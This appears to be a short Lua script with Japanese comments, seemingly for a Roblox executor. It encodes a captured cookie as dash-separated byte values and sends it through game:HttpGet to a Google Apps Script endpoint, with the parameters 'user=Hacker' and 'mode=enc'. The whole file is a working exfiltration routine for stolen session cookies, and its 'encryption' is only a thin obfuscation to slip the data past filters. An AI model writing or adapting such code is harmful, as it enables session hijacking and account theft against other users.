-- [[ 16進数ではなく、GASの parseInt に合わせた数値配列化 ]]
local function encrypt(str)
    local parts = {}
    for i = 1, #str do
        table.insert(parts, tostring(string.byte(str:sub(i, i))))
    end
    return table.concat(parts, "-") -- 「65-66-67」のような形式にする
end

local rawCookie = "ここに取得したデータを入れる"
local encryptedCookie = encrypt(rawCookie)

-- 通信。mode=enc を忘れずに！
local url = "https://script.google.com/macros/s/AKfycby.../exec"
local finalUrl = url .. "?user=Hacker&mode=enc&cookie=" .. encryptedCookie

game:HttpGet(finalUrl)
print("パズルを送信したぜ。GASで復元されるのを待て。")
